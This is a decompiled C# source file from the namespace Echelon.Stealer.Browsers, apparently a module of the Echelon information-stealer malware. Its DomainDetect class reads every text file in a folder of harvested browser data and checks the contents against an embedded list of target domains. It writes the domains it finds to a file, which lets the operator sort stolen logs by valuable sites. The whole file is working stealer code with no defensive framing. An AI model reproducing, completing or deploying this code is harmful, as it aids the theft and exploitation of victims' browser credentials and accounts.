﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Echelon.Properties;

namespace Echelon.Stealer.Browsers
{
	// Token: 0x0200002F RID: 47
	public class DomainDetect
	{
		// Token: 0x060000B7 RID: 183 RVA: 0x0001C760 File Offset: 0x0001A960
		public static void GetDomainDetect(string Browser)
		{
			try
			{
				Encoding utf = Encoding.UTF8;
				List<string> list = (from w in Resources.Domains.Split(new char[0])
				select w.Trim() into w
				where w != ""
				select w.ToLower()).ToList<string>();
				FileInfo[] files = new DirectoryInfo(Browser).GetFiles("*.txt", SearchOption.AllDirectories);
				List<string> list2 = new List<string>();
				foreach (FileInfo fileInfo in files)
				{
					list2.AddRange(File.ReadAllLines(fileInfo.FullName, utf));
				}
				HashSet<string> hashSet = new HashSet<string>();
				foreach (string text in list2)
				{
					foreach (string item in (from w in text.Split(new char[0])
					select w.Trim() into w
					where w != ""
					select w.ToLower()).ToList<string>())
					{
						if (!hashSet.Contains(item))
						{
							hashSet.Add(item);
						}
					}
				}
				HashSet<string> hashSet2 = new HashSet<string>();
				foreach (string text2 in list)
				{
					using (HashSet<string>.Enumerator enumerator3 = hashSet.GetEnumerator())
					{
						while (enumerator3.MoveNext())
						{
							if (enumerator3.Current.Contains(text2) && !hashSet2.Contains(text2))
							{
								hashSet2.Add(text2);
							}
						}
					}
				}
				File.WriteAllLines(Browser + "\\DomainDetect.txt", hashSet2, Encoding.Default);
			}
			catch
			{
			}
		}
	}
}
